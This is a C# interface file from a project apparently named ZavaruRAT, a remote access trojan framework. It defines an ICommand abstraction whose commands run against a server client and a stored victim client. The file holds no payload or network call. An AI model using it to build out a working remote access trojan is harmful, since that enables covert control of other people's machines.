#region

using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Node.Commands.Abstractions;

public interface ICommand
{
    Task ExecuteAsync(CommandEvent command, MainServerClient server, ZavaruStoredClient client);
}
